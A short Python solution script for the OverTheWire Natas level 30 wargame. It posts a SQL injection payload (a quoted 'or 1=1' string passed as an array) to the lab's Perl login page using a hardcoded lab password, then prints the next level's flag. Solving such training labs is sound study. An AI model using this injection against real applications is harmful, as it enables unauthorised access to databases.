import requests
import re

def flag(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    payload = {
            "username":"natas31",
            "password":["'lol' or 1=1",4]
            }
    req = requests.post(url + "index.pl", data=payload, auth=(username,password))
    text = re.findall("result:<br>natas31(.*)<div",req.text)
    print("The flag for natas31 is: " + text[0])

if __name__=="__main__":
    url = "http://natas30.natas.labs.overthewire.org/"
    username = "natas30"
    password = "Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X"
    flag(url,username,password)